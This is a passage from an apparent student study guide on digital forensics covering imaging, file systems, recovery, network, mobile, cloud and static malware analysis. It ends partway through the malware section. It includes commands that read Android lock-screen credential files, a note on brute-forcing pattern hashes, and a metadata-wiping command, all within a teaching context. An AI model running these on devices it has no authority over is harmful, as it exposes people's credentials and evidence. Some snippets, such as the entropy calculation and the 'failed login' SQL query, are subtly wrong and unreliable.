# 🔐 Digital Forensics & Cybersecurity — Complete Study Guide

### For Cybersecurity Department Students | Software Engineering Background

> **Scope:** Full theoretical + practical lab coverage | Black Hat / White Hat / Gray Hat techniques for learning | Tested on own systems, self-created websites, and Metasploitable2 VM

---

## 📋 Table of Contents

1. [Introduction to Digital Forensics](#1-introduction-to-digital-forensics)
2. [Types of Digital Forensics](#2-types-of-digital-forensics)
3. [Digital Forensics Process (Step-by-Step)](#3-digital-forensics-process)
4. [File Systems Deep Dive](#4-file-systems-deep-dive)
5. [Data Recovery Techniques](#5-data-recovery-techniques)
6. [Essential Tools & Their Usage](#6-essential-tools--their-usage)
7. [Network Forensics](#7-network-forensics)
8. [Mobile Device Forensics](#8-mobile-device-forensics)
9. [Cloud Forensics](#9-cloud-forensics)
10. [Malware Forensic Analysis](#10-malware-forensic-analysis)
11. [Encryption & Decryption in Forensics](#11-encryption--decryption-in-forensics)
12. [Hashing & Data Integrity](#12-hashing--data-integrity)
13. [Legal Aspects & Chain of Custody](#13-legal-aspects--chain-of-custody)
14. [VoIP Forensics](#14-voip-forensics)
15. [Email Header Forensics](#15-email-header-forensics)
16. [Image/Metadata Forensics](#16-imagemetadata-forensics)
17. [File Carving Techniques](#17-file-carving-techniques)
18. [Forensic Imaging](#18-forensic-imaging)
19. [USB Device Forensics Lab](#19-usb-device-forensics-lab)
20. [Case Studies: WannaCry Ransomware](#20-case-study-wannacry-ransomware)
21. [Supply Chain Attack Forensics](#21-supply-chain-attack-forensics)
22. [Data Breach Forensics](#22-data-breach-forensics)
23. [Hacking Techniques (Black/White/Gray Hat)](#23-hacking-techniques-for-learning)
24. [Lab Setup: Full Environment](#24-full-lab-environment-setup)
25. [Practical Labs on Own Systems & Metasploitable2](#25-practical-labs)
26. [Building a Forensic Report](#26-building-a-forensic-report)
27. [Portfolio Building & Career Path](#27-portfolio-building--career-path)
28. [Future Trends: AI, Blockchain, IoT Forensics](#28-future-trends)
29. [Recommended Books & Resources](#29-recommended-books--resources)

---

## 1. Introduction to Digital Forensics

### What is Digital Forensics?

Digital Forensics is the science of **collecting, preserving, analyzing, and presenting digital evidence** in a legally acceptable manner. It sits at the intersection of cybersecurity and law.

```
Digital Forensics = Evidence Collection + Preservation + Analysis + Legal Presentation
```

### Core Goals

| Goal         | Description                                           |
| ------------ | ----------------------------------------------------- |
| **Collect**  | Gather digital evidence from devices, networks, cloud |
| **Preserve** | Protect evidence integrity — no tampering             |
| **Analyze**  | Examine data using forensic techniques and tools      |
| **Present**  | Submit findings legally in court or to authorities    |

### What is Digital Evidence?

Any data in **any form** that can be used in a legal context:

- Files, documents, images, videos
- Emails and communication logs
- System logs, event logs
- Network traffic captures
- Database records
- GPS/location data

### Why Digital Forensics Matters

- **Cybercrime is exponentially growing** — not linear, nearly exponential increase year-over-year
- **Legal compliance** — you cannot take legal action without strong digital evidence
- **Incident response** — when a server/company is attacked, forensics helps understand what happened
- **Corporate investigations** — data leaks, insider threats, IP theft

### Digital Forensics vs. Data Recovery

| Aspect              | Data Recovery      | Digital Forensics              |
| ------------------- | ------------------ | ------------------------------ |
| Goal                | Retrieve lost data | Investigate + evidence + legal |
| Legal aspect        | Not required       | Mandatory                      |
| Chain of custody    | Not needed         | Critical                       |
| Court admissibility | No                 | Yes                            |

---

## 2. Types of Digital Forensics

### 2.1 Computer Forensics

**Target:** Computers, servers, storage devices, removable media (pen drives, external HDDs, SD cards)

**Key Activities:**

- Examining hard disks and SSDs
- Recovering deleted/corrupted files
- Analyzing file system structure
- Detecting and analyzing malware
- Examining removable media (USB, SD cards, optical media)

```bash
# Example: List all connected block devices
lsblk -a

# Example: Check disk information
sudo fdisk -l

# Example: Identify file system type
sudo file -s /dev/sdb1
```

### 2.2 Network Forensics

**Target:** Network traffic, protocols, packets, IDS/IPS logs

**Key Activities:**

- Monitoring and analyzing network traffic
- Capturing and analyzing data packets
- Setting up and examining IDS (Intrusion Detection Systems)
- Identifying unauthorized access
- Detecting data breaches via network logs
- Recovering deleted network logs

```bash
# Capture live traffic on interface eth0
sudo tcpdump -i eth0 -w capture.pcap

# Read a pcap file
sudo tcpdump -r capture.pcap

# Filter HTTP traffic
sudo tcpdump -i eth0 port 80 -w http_traffic.pcap
```

### 2.3 Mobile Device Forensics

**Target:** Android, iOS, Windows Phone, feature phones

**Key Activities:**

- Data extraction (physical and logical)
- Analyzing call logs and SMS messages
- App data analysis
- GPS and location data extraction
- Recovering data from damaged devices

### 2.4 Cloud Forensics

**Target:** Cloud platforms (PaaS, IaaS, SaaS), cloud storage

**Key Activities:**

- Investigating cloud-stored data
- Understanding shared responsibility models
- Working within data retention policies
- Handling multi-tenancy challenges
- Legal and jurisdictional considerations

### 2.5 Database Forensics

**Target:** SQL/NoSQL databases, transaction logs

**Key Activities:**

- Examining database transaction logs
- Recovering deleted records
- Investigating unauthorized access
- Identifying data breaches

```sql
-- Example: Query database logs for suspicious activity
SELECT * FROM mysql.general_log
WHERE event_time > NOW() - INTERVAL 24 HOUR
ORDER BY event_time DESC;

-- Check failed login attempts
SELECT user, host, authentication_string
FROM mysql.user;
```

### 2.6 IoT Forensics

**Target:** Smart devices — smart TVs, smart fridges, smart watches, IoT sensors

**Key Activities:**

- Analyzing smart device data
- Understanding device communication patterns
- Extracting evidence from embedded systems
- Handling unique IoT challenges (limited storage, proprietary OS)

---

## 3. Digital Forensics Process

### The Complete 7-Step Process

```
┌─────────────────────────────────────────────────────┐
│  1. IDENTIFICATION   →  What happened? What devices? │
│  2. PRESERVATION     →  Protect evidence integrity   │
│  3. COLLECTION       →  Gather physical evidence     │
│  4. EXAMINATION      →  Technical deep-dive          │
│  5. ANALYSIS         →  Make sense of the data       │
│  6. REPORTING        →  Document findings            │
│  7. PRESENTATION     →  Present in court/authority   │
└─────────────────────────────────────────────────────┘
```

### Step 1: Identification

**Goal:** Determine what happened, which devices/systems are involved

```bash
# Identify connected drives
sudo lsblk

# Check running processes (for live forensics)
ps aux --sort=-%cpu | head -20

# List network connections at the time of incident
sudo netstat -antp
sudo ss -tulnp

# Check logged-in users
who
w
last
```

**Questions to answer:**

- What type of incident occurred?
- Which systems/devices are affected?
- What time did it occur?
- Who had access?

### Step 2: Preservation

**Goal:** Protect evidence from being altered, deleted, or contaminated

```bash
# Create MD5 hash of evidence drive BEFORE touching it
md5sum /dev/sdb > evidence_hash_before.txt

# Write-protect a device (using hdparm)
sudo hdparm -r1 /dev/sdb

# Use dd with write-blocker effect (read-only mounting)
sudo mount -o ro /dev/sdb1 /mnt/evidence

# Verify hash after operations
md5sum /dev/sdb > evidence_hash_after.txt
diff evidence_hash_before.txt evidence_hash_after.txt
```

**Key principle:** Never work directly on original evidence. Always work on a copy/image.

### Step 3: Collection

**Goal:** Physically and digitally collect evidence

```bash
# Create a bit-by-bit forensic image using dd
sudo dd if=/dev/sdb of=/evidence/usb_image.dd bs=4096 conv=noerror,sync status=progress

# Using dcfldd (enhanced dd for forensics)
sudo dcfldd if=/dev/sdb of=/evidence/usb_image.dd hash=md5,sha256 hashlog=/evidence/hash.log

# Create image with FTK Imager (command line)
ftkimager /dev/sdb /evidence/disk_image --e01
```

### Step 4: Examination

**Goal:** Technical deep-dive into collected evidence

```bash
# Mount a forensic image
sudo losetup -fP usb_image.dd
sudo mount -o ro /dev/loop0 /mnt/forensic_mount

# List all files including hidden
ls -la /mnt/forensic_mount/

# Find recently modified files
find /mnt/forensic_mount -mtime -7 -type f 2>/dev/null

# Search for specific file types
find /mnt/forensic_mount -name "*.log" -o -name "*.txt" 2>/dev/null

# Check file timestamps (access, modify, change)
stat /mnt/forensic_mount/suspicious_file.txt
```

### Step 5: Analysis

**Goal:** Understand what the evidence means

```bash
# Analyze file signatures (magic bytes)
file /mnt/forensic_mount/unknown_file

# Check file header manually (hex view)
xxd /mnt/forensic_mount/unknown_file | head -20

# Extract strings from binary
strings /mnt/forensic_mount/binary_file | grep -E "(http|ftp|password|login)"

# Analyze metadata with exiftool
exiftool /mnt/forensic_mount/photo.jpg

# Timeline analysis with Autopsy or log2timeline
log2timeline.py /evidence/timeline.csv /mnt/forensic_mount/
```

### Step 6: Reporting

**Goal:** Document all findings in a structured format

A forensic report must contain:

1. **Case Information** — title, examiner name, date, case number
2. **Executive Summary** — brief overview for non-technical readers
3. **Methodology** — how evidence was collected and analyzed
4. **Evidence List** — all collected evidence with hashes
5. **Findings** — technical details of what was discovered
6. **Timeline** — chronological sequence of events
7. **Conclusions** — what the evidence means
8. **Recommendations** — how to prevent recurrence

### Step 7: Presentation

**Goal:** Present findings in court or to legal authorities

- All evidence must be legally acquired
- Chain of custody must be unbroken
- Expert testimony may be required
- Digital signatures on reports ensure integrity

---

## 4. File Systems Deep Dive

### Why File Systems Matter in Forensics

Understanding file systems is **critical** because:

- Data storage format determines how to extract it
- Different systems have different metadata structures
- Recovery tools must match the file system type

### 4.1 FAT (File Allocation Table)

**Used in:** USB drives, SD cards, older media

**Structure:**

```
┌────────────┬──────────────┬─────────────────┐
│ Boot Sector│  FAT Table   │  Data Area       │
│            │  (x2 copies) │  (Files/Dirs)    │
└────────────┴──────────────┴─────────────────┘
```

**Forensic characteristics:**

- Simple structure → **easier to recover deleted files**
- No journaling → deleted entries remain until overwritten
- FAT12, FAT16, FAT32 variants
- Max file size: 4GB (FAT32)

```bash
# Check FAT file system
sudo fsck.fat -n /dev/sdb1

# Mount FAT partition
sudo mount -t vfat /dev/sdb1 /mnt/fat_drive

# View FAT metadata
sudo fatcat /dev/sdb1 -i
```

**Data recovery on FAT:**

- When a file is deleted, the first character of filename is replaced with `0xE5`
- FAT entry is marked free, but data remains
- Recovery is possible until sectors are overwritten

### 4.2 NTFS (New Technology File System)

**Used in:** Windows OS (default)

**Structure:**

```
┌──────────┬──────────┬───────────────┬──────────────┐
│  $Boot   │  $MFT    │  $LogFile     │  Data Area   │
│(Boot Sec)│(Master   │(Journal for   │(Actual files)│
│          │ File Tbl)│ transactions) │              │
└──────────┴──────────┴───────────────┴──────────────┘
```

**Key NTFS features for forensics:**

- **$MFT (Master File Table):** Metadata for every file
- **$LogFile:** Transaction journal — helps recover recent changes
- **$INDX:** Directory index buffers — can contain deleted filenames
- **Alternate Data Streams (ADS):** Hidden data within files
- **$Recycle.bin:** Tracks deleted files

```bash
# Mount NTFS (Linux)
sudo mount -t ntfs-3g /dev/sdb1 /mnt/ntfs_drive

# Analyze NTFS metadata with ntfscat
ntfscat /dev/sdb1 -i 2  # Read $MFT

# List all NTFS streams
ntfscat /dev/sdb1 -a suspicious_file.exe

# Check for Alternate Data Streams (Windows)
# dir /r suspicious_file.txt
# type suspicious_file.txt:hidden_stream

# Linux equivalent - check ADS
getfattr -n ntfs.streams.list file.txt

# Analyze $MFT entries
analyzeMFT.py -f /dev/sdb1 -o mft_analysis.csv
```

**NTFS forensic artifacts:**

- `$MFT` — complete file listing including deleted
- `$LogFile` — recent file operations
- `$UsnJrnl:$J` — change journal (last 32MB of changes)
- Prefetch files — `C:\Windows\Prefetch\*.pf`
- Registry hives — `HKLM\SYSTEM`, `HKLM\SOFTWARE`, `NTUSER.DAT`

### 4.3 ext4 (Fourth Extended File System)

**Used in:** Linux (default)

**Structure:**

```
┌──────────┬────────────┬────────────┬──────────────┐
│  Super   │  Block     │  Inode     │  Data Blocks │
│  Block   │  Groups    │  Tables    │              │
└──────────┴────────────┴────────────┴──────────────┘
```

**Forensic characteristics:**

- Journaling reduces data loss
- Inodes store file metadata (not filenames)
- Directory entries link filenames to inodes
- Deleted files: inode zeroed but data may persist

```bash
# Check ext4 filesystem
sudo e2fsck -n /dev/sdb1

# View filesystem info
sudo tune2fs -l /dev/sdb1

# Mount ext4 for forensics
sudo mount -o ro,noatime /dev/sdb1 /mnt/ext4_forensic

# Examine inode information
sudo stat /mnt/ext4_forensic/somefile.txt
sudo debugfs -R "stat <inode_number>" /dev/sdb1

# List deleted files using debugfs
sudo debugfs /dev/sdb1
debugfs: lsdel

# Recover deleted file by inode
debugfs: dump -p <inode_number> /recovery/recovered_file
```

### 4.4 Three Core Components for Data Recovery

```
┌─────────────────────────────────────────────┐
│  1. File Control Block (FCB)                │
│     - Stores metadata: name, size,          │
│       permissions, location                 │
│     - Used to determine access patterns     │
│       and file ownership                    │
├─────────────────────────────────────────────┤
│  2. Directory Structure                     │
│     - How files are organized               │
│     - Relationships between files/dirs      │
│     - Helps locate where data lives         │
├─────────────────────────────────────────────┤
│  3. Data Blocks                             │
│     - Actual stored data                    │
│     - When file deleted → blocks marked     │
│       free but data remains                 │
│     - THIS is what we recover               │
└─────────────────────────────────────────────┘
```

---

## 5. Data Recovery Techniques

### 5.1 Backup and Restore (Best Method)

**Prevention is better than cure.** If you have backups:

```bash
# Create backup using rsync
rsync -avz --progress /important/data/ /backup/location/

# Backup with timestamp
tar -czf backup_$(date +%Y%m%d_%H%M%S).tar.gz /important/data/

# Verify backup integrity
md5sum backup_file.tar.gz > backup_hash.md5
md5sum -c backup_hash.md5  # Later verification

# Restore from backup
tar -xzf backup_20240101_120000.tar.gz -C /restore/location/
```

**Quality loss in recovery:**

- Original → 100% quality
- From backup → 100% quality ✅
- Recovered from deleted → 60-90% quality (depends on overwriting)
- Recovered from corrupted → 30-80% quality
- After multiple overwrites → Near impossible

### 5.2 Recovery Software

| Software                  | Platform       | Best For                       |
| ------------------------- | -------------- | ------------------------------ |
| **Recuva**                | Windows        | Easy GUI-based recovery        |
| **EaseUS Data Recovery**  | Win/Mac        | User-friendly, various formats |
| **Stellar Data Recovery** | Win/Mac        | Professional-grade             |
| **PhotoRec**              | Cross-platform | File carving, open-source      |
| **TestDisk**              | Cross-platform | Partition recovery             |
| **Foremost**              | Linux          | Forensic file carving          |
| **Scalpel**               | Linux          | Advanced file carving          |

### 5.3 Disk Imaging (Technical Method)

**Golden Rule:** Always image first, then work on the image — never the original!

```bash
# Method 1: dd (basic but reliable)
sudo dd if=/dev/sdb of=/evidence/disk.img bs=512 conv=noerror,sync status=progress

# Method 2: dcfldd (forensic-grade dd)
sudo dcfldd if=/dev/sdb of=/evidence/disk.img \
    hash=md5,sha256 \
    hashlog=/evidence/hashes.txt \
    bs=512 \
    conv=noerror,sync

# Method 3: ddrescue (for damaged drives)
sudo ddrescue -d -r3 /dev/sdb /evidence/disk.img /evidence/mapfile.log

# Method 4: Using FTK Imager CLI
ftkimager /dev/sdb /evidence/image --e01 --compress 6

# Verify image integrity
md5sum /evidence/disk.img
sha256sum /evidence/disk.img

# Mount the image for analysis
sudo losetup --find --show /evidence/disk.img
sudo mount -o ro /dev/loop0 /mnt/image_mount
```

**⚠️ Critical Rule:**

```
NEVER write new data to a drive containing deleted data you want to recover!
Overwriting = Permanent loss of recovery possibility
```

### 5.4 Professional Data Recovery Services

Forensic process for professional recovery:

1. Receive device
2. Physical examination
3. Create forensic image
4. Apply recovery algorithms
5. Verify recovered data
6. Report and delivery

### 5.5 Command Line Recovery Tools

```bash
# PhotoRec — recover files from storage
sudo photorec /dev/sdb

# Foremost — header-based file carving
sudo foremost -t jpg,pdf,docx -i /evidence/disk.img -o /recovery/output/

# Scalpel — configurable file carving
sudo scalpel /evidence/disk.img -o /recovery/output/

# Strings extraction (for partial recovery)
strings /evidence/disk.img | grep -i "password\|username\|email" > strings_output.txt

# Bulk Extractor — extract artifacts from disk images
bulk_extractor -o /evidence/output/ /evidence/disk.img
```

---

## 6. Essential Tools & Their Usage

### 6.1 EnCase

**Type:** Commercial, industry-standard
**Best for:** Enterprise investigations, court-admissible evidence

**Features:**

- Comprehensive disk imaging
- Evidence management
- Built-in hash verification
- Court-ready reporting
- File carving and recovery
- Timeline analysis

```
EnCase workflow:
1. Create new case
2. Add evidence (disk image/physical device)
3. Verify hash integrity
4. Analyze with EnScript (scripting language)
5. Generate report
```

### 6.2 FTK (Forensic Tool Kit)

**Type:** Commercial
**Best for:** Large dataset analysis, fast indexing

**Features:**

- File signature analysis
- Extremely fast large dataset processing
- Email analysis
- Registry analysis
- Password cracking integration

```bash
# FTK Imager CLI usage
ftkimager /dev/sdb /output/image --e01 --compress 9 \
    --description "USB drive evidence" \
    --case-number "CASE-2024-001" \
    --evidence-number "EV-001" \
    --examiner "Your Name"
```

### 6.3 Autopsy (Open Source ★ Recommended for Students)

**Type:** Open-source, free
**Best for:** Beginners + professionals, comprehensive analysis

```bash
# Install Autopsy on Kali/Parrot
sudo apt update
sudo apt install autopsy

# Launch Autopsy (web interface)
autopsy

# Access at: http://localhost:9999/autopsy

# Alternative: Direct command line
autopsy -p 9999
```

**Autopsy features:**

- Timeline analysis
- Keyword search
- Web artifact extraction
- Hash set filtering
- Email analysis
- File carving
- Registry analysis
- Android/iOS support

**Practical Autopsy Lab:**

```
1. Open Autopsy: http://localhost:9999/autopsy
2. Create new case: "MyForensicLab"
3. Add evidence: Add your disk image or USB
4. Run ingest modules:
   - Hash Lookup
   - Keyword Search
   - File Type ID
   - Recent Activity
5. Analyze results in timeline
6. Export findings as HTML report
```

### 6.4 Wireshark

**Type:** Open-source, network protocol analyzer
**Best for:** Network forensics, packet analysis

```bash
# Install
sudo apt install wireshark tshark

# Capture on interface
sudo wireshark &
# Or CLI:
sudo tshark -i eth0 -w capture.pcap

# Read capture file
tshark -r capture.pcap

# Filter by protocol
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "dns"
tshark -r capture.pcap -Y "ftp"

# Filter by IP
tshark -r capture.pcap -Y "ip.src == 192.168.1.100"

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,/output/http_objects/

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# Statistics
tshark -r capture.pcap -q -z io,phs   # Protocol hierarchy
tshark -r capture.pcap -q -z endpoints,ip  # IP endpoints
```

**Wireshark Display Filters Cheatsheet:**

```
http                    → HTTP traffic
https or ssl            → HTTPS/SSL traffic
dns                     → DNS queries
ftp                     → FTP traffic
smtp or pop or imap     → Email protocols
tcp.port == 80          → Specific port
ip.addr == 10.0.0.1     → Specific IP
!(arp or icmp or dns)   → Exclude noise
tcp.flags.syn == 1      → SYN packets (connections)
http.request.method == "POST"  → POST requests
```

### 6.5 Volatility (Memory Forensics)

**Type:** Open-source
**Best for:** RAM forensics, malware analysis

```bash
# Install Volatility3
pip3 install volatility3

# Identify OS profile
vol.py -f memory.dump windows.info
vol.py -f memory.dump linux.info

# List running processes
vol.py -f memory.dump windows.pslist
vol.py -f memory.dump windows.pstree

# Network connections from memory
vol.py -f memory.dump windows.netstat

# Scan for malware (hidden processes)
vol.py -f memory.dump windows.malfind

# Dump a specific process memory
vol.py -f memory.dump windows.dumpfiles --pid 1234

# Extract registry hives from memory
vol.py -f memory.dump windows.registry.hivelist

# Find command history
vol.py -f memory.dump windows.cmdline

# Capture memory dump (Linux)
sudo dd if=/dev/mem of=memory.dump bs=1MB
# Or use LiME kernel module:
sudo insmod lime.ko "path=/evidence/memory.lime format=lime"
```

### 6.6 ExifTool (Metadata Analysis)

```bash
# Install
sudo apt install exiftool

# Basic metadata extraction
exiftool image.jpg

# Extract all metadata
exiftool -a -u -g1 image.jpg

# Extract GPS coordinates
exiftool -GPS* image.jpg

# Remove all metadata (anti-forensics)
exiftool -all= image.jpg

# Process entire directory
exiftool -r /path/to/photos/

# Export to CSV
exiftool -csv /path/to/photos/ > metadata.csv

# Find photos with GPS data
exiftool -if '$GPSLatitude' -p '$Filename: $GPSLatitude, $GPSLongitude' /photos/
```

### 6.7 KALI CAINE OS — Dedicated Forensic OS

CAINE (Computer Aided INvestigative Environment) is a forensic-focused Linux distro.

**Installation and setup for lab:**

```bash
# Download CAINE ISO from caine-live.net
# Boot in VirtualBox/VMware
# Default credentials: caine/caine

# Key tools pre-installed in CAINE:
# - Autopsy
# - Wireshark
# - Volatility
# - PhotoRec/TestDisk
# - Foremost/Scalpel
# - NetworkMiner
# - RegRipper
```

---

## 7. Network Forensics

### 7.1 What is Network Forensics?

The process of **capturing, recording, and analyzing network packets** to discover the source of security attacks or other network problems.

### 7.2 Core Techniques

#### Traffic Analysis

```bash
# Real-time traffic monitoring
sudo tcpdump -i eth0 -n -v

# Save to file for later analysis
sudo tcpdump -i eth0 -w /evidence/traffic.pcap

# Monitor specific host
sudo tcpdump -i eth0 host 192.168.1.100

# Monitor specific port
sudo tcpdump -i eth0 port 443

# Capture DNS queries
sudo tcpdump -i eth0 port 53 -n

# Monitor HTTP POST requests (potential data exfiltration)
sudo tcpdump -i eth0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

#### Log Analysis

```bash
# System logs (Linux)
tail -f /var/log/syslog
tail -f /var/log/auth.log

# SSH brute force detection
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# Apache access logs
cat /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head -20

# Nginx logs
tail -f /var/log/nginx/access.log

# Windows Event Log (PowerShell)
# Get-EventLog -LogName Security -Newest 100
# Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}  # Failed logins
```

#### IDS/IPS Analysis with Snort

```bash
# Install Snort
sudo apt install snort

# Basic Snort rule example
# alert tcp any any -> $HOME_NET 22 (msg:"SSH connection attempt"; sid:1000001; rev:1;)

# Run Snort in IDS mode
sudo snort -A console -q -i eth0 -c /etc/snort/snort.conf

# Run Snort on pcap
sudo snort -r capture.pcap -c /etc/snort/snort.conf -l /var/log/snort/

# Alert rules location
cat /etc/snort/rules/local.rules
```

### 7.3 Network Forensics Tools

| Tool             | Purpose                    | Usage                      |
| ---------------- | -------------------------- | -------------------------- |
| **Wireshark**    | Packet analysis GUI        | See section 6.4            |
| **tcpdump**      | CLI packet capture         | `sudo tcpdump -i eth0`     |
| **NetworkMiner** | Network forensic analyzer  | Windows GUI tool           |
| **Zeek (Bro)**   | Network analysis framework | `zeek -r capture.pcap`     |
| **Snort**        | IDS/IPS                    | See above                  |
| **Suricata**     | Modern IDS/IPS             | `suricata -r capture.pcap` |
| **ntopng**       | Real-time traffic monitor  | Web-based interface        |

### 7.4 Detecting Common Network Attacks

```bash
# Detect port scanning (many SYN packets from one IP)
tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" \
    -T fields -e ip.src | sort | uniq -c | sort -nr

# Detect ARP spoofing
arpwatch -i eth0

# Detect DNS tunneling (unusually large DNS packets)
tshark -r capture.pcap -Y "dns and frame.len > 512"

# Detect suspicious outbound connections
tshark -r capture.pcap -Y "tcp.dstport != 80 and tcp.dstport != 443 and tcp.dstport != 22" \
    -T fields -e ip.dst | sort | uniq -c | sort -nr
```

---

## 8. Mobile Device Forensics

### 8.1 Mobile Forensics Overview

**What can be extracted from a mobile device:**

```
┌─────────────────────────────────────────────────────┐
│  CALL LOGS      - Incoming, outgoing, missed calls  │
│  SMS/MMS        - Text messages, multimedia         │
│  CONTACTS       - Phone book                        │
│  EMAILS         - Mail accounts content             │
│  APP DATA       - WhatsApp, Telegram, Instagram     │
│  PHOTOS/VIDEOS  - Media files + EXIF metadata       │
│  GPS/LOCATION   - Location history                  │
│  BROWSER        - History, cookies, passwords       │
│  WIFI NETWORKS  - Connected networks history        │
│  PASSWORDS      - Saved credentials (if accessible) │
│  DELETED DATA   - Recoverable deleted content       │
└─────────────────────────────────────────────────────┘
```

### 8.2 Extraction Methods

#### Physical Extraction (Full Device Clone)

```bash
# Using ADB (Android Debug Bridge) — needs developer mode enabled
adb devices                        # List connected devices
adb backup -all -f backup.ab      # Full backup
adb pull /sdcard/ /local/backup/   # Pull SD card content

# Create full physical image with dd over ADB
adb shell dd if=/dev/block/mmcblk0 | dd of=phone_image.img

# Using Magisk/root for physical extraction
adb shell "su -c 'dd if=/dev/block/mmcblk0p21 bs=4096 | gzip -9'" > userdata.img.gz
```

#### Logical Extraction (User-accessible data)

```bash
# Standard ADB backup
adb backup -apk -shared -all -f full_backup.ab

# Convert ADB backup to tar
dd if=full_backup.ab bs=24 skip=1 | python3 -c "import sys, zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > backup.tar

# Extract tar
tar -xvf backup.tar

# Using content providers
adb shell content query --uri content://sms/
adb shell content query --uri content://call_log/calls/
adb shell content query --uri content://contacts/phones/
```

### 8.3 Mobile Forensics Tools

| Tool                | Platform   | Features                               |
| ------------------- | ---------- | -------------------------------------- |
| **Cellebrite UFED** | Commercial | Industry standard, physical extraction |
| **Oxygen Forensic** | Commercial | Data analysis, cloud extraction        |
| **Magnet AXIOM**    | Commercial | Mobile + computer forensics            |
| **XRY**             | Commercial | Physical + logical extraction          |
| **MOBILedit**       | Commercial | App data extraction                    |
| **ALEAPP**          | Free       | Android log analysis                   |
| **iLEAPP**          | Free       | iOS log analysis                       |
| **ADB**             | Free       | Basic Android extraction               |
| **MVT**             | Free       | Malware/spyware detection              |

### 8.4 Android Forensics Lab

```bash
# Install required tools
sudo apt install adb android-sdk-platform-tools

# Enable on phone: Settings → Developer Options → USB Debugging

# Connect and verify
adb devices

# Extract SMS messages
adb shell content query --uri content://sms/ > sms_dump.txt

# Extract call logs
adb shell content query --uri content://call_log/calls/ > call_log.txt

# Pull specific app database
adb shell
ls /data/data/com.whatsapp/databases/
exit
adb pull /data/data/com.whatsapp/databases/msgstore.db

# Analyze WhatsApp database
sqlite3 msgstore.db
.tables
SELECT * FROM messages LIMIT 10;
.quit

# Extract photos with metadata preserved
adb pull /sdcard/DCIM/ /local/photos/
exiftool -r /local/photos/ -csv > photo_metadata.csv

# GPS coordinates from photos
exiftool -GPS* /local/photos/*.jpg
```

### 8.5 Challenges in Mobile Forensics

1. **Encryption:** Modern phones encrypt storage by default
2. **Data Volatility:** Data can be wiped remotely (Find My Device)
3. **Lock Screen:** PIN/Pattern/Biometric locks
4. **Proprietary OS:** iOS is particularly locked down
5. **App Encryption:** End-to-end encrypted apps (Signal, WhatsApp)

**Dealing with locked devices:**

```bash
# Check if device is accessible
adb devices
# If "unauthorized" → physical screen unlock needed

# Check lockscreen type
adb shell getprop ro.crypto.state      # encrypted/unencrypted
adb shell getprop ro.crypto.type       # encryption type

# For rooted devices
adb shell su -c 'cat /data/system/gesture.key | xxd'
adb shell su -c 'cat /data/system/password.key | xxd'

# Brute force pattern (research purposes only, own device)
# Pattern stored as SHA1 hash in /data/system/gesture.key
```

---

## 9. Cloud Forensics

### 9.1 Cloud Forensics Challenges

```
┌─────────────────────────────────────────────────────┐
│  CHALLENGE 1: Data Location & Jurisdiction          │
│  Data distributed across multiple countries         │
│  Different laws apply per jurisdiction              │
├─────────────────────────────────────────────────────┤
│  CHALLENGE 2: Data Volatility                       │
│  Cloud providers have data retention policies       │
│  Logs deleted after 15-90 days typically            │
├─────────────────────────────────────────────────────┤
│  CHALLENGE 3: Lack of Control                       │
│  CSP controls infrastructure                        │
│  Limited physical access                            │
├─────────────────────────────────────────────────────┤
│  CHALLENGE 4: Encryption                            │
│  Data encrypted in transit and at rest              │
│  Need decryption keys                               │
├─────────────────────────────────────────────────────┤
│  CHALLENGE 5: Multi-tenancy                         │
│  Multiple organizations share infrastructure        │
│  Risk of accessing wrong tenant's data              │
└─────────────────────────────────────────────────────┘
```

### 9.2 Cloud Evidence Sources

```bash
# AWS CloudTrail logs
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin

# AWS S3 access logs
aws s3api get-bucket-logging --bucket your-bucket-name
aws s3 sync s3://your-bucket/logs/ ./local-logs/

# Azure Activity Logs
az monitor activity-log list --start-time 2024-01-01

# Google Cloud Logging
gcloud logging read "resource.type=gce_instance" --limit 100

# Docker container logs
docker logs container_name
docker logs --since 2024-01-01T00:00:00 container_name
```

### 9.3 Cloud Forensics Solutions

```
1. Request logs from Cloud Service Provider (CSP)
2. Use cloud-native logging tools (CloudTrail, Azure Monitor)
3. Set up real-time log streaming before incidents occur
4. Use SIEM integration (Splunk, Elastic SIEM)
5. Document all actions with timestamps
```

---

## 10. Malware Forensic Analysis

### 10.1 Types of Malware

| Type           | Description               | Behavior               |
| -------------- | ------------------------- | ---------------------- |
| **Virus**      | Self-replicating code     | Attaches to host files |
| **Worm**       | Self-propagating          | Spreads via network    |
| **Trojan**     | Disguised malware         | Appears legitimate     |
| **Ransomware** | Encrypts data for ransom  | Locks files/systems    |
| **Rootkit**    | Hides malicious activity  | Kernel-level access    |
| **Keylogger**  | Records keystrokes        | Steals credentials     |
| **Spyware**    | Monitors user activity    | Data theft             |
| **Botnet**     | Remote-controlled network | DDoS, spam             |
| **Adware**     | Displays unwanted ads     | Revenue generation     |
| **Fileless**   | Runs in memory only       | Hard to detect         |

### 10.2 Static Malware Analysis

**Analyze malware WITHOUT running it:**

```bash
# Basic file information
file suspicious.exe
exiftool suspicious.exe

# Hash identification
md5sum suspicious.exe
sha256sum suspicious.exe
# Check hash on VirusTotal: https://virustotal.com

# String extraction
strings suspicious.exe
strings -n 8 suspicious.exe  # Minimum 8 chars
strings -el suspicious.exe   # Unicode strings (Windows)

# Detect packers/obfuscation
upx -l suspicious.exe       # Check if UPX packed
# PEiD, ExeinfoPE (Windows tools)

# PE header analysis (Windows executables)
sudo apt install pev
pestr suspicious.exe         # String analysis
pescan suspicious.exe        # Scan for anomalies
pehash suspicious.exe        # Import hash
readpe suspicious.exe        # Full PE header

# Entropy analysis (high entropy = packed/encrypted)
python3 -c "
import math, sys
data = open('suspicious.exe', 'rb').read()
entropy = -sum(c/256 * math.log2(c/256) for c in [data.count(bytes([i])) for i in range(256)] if c > 0)
print(f'Entropy: {entropy:.2f}/8.0 (>7.0 = likely packed)')
"

# Check imports/exports
objdump -d suspicious.exe    # Disassemble
nm suspicious.exe            # Symbol table
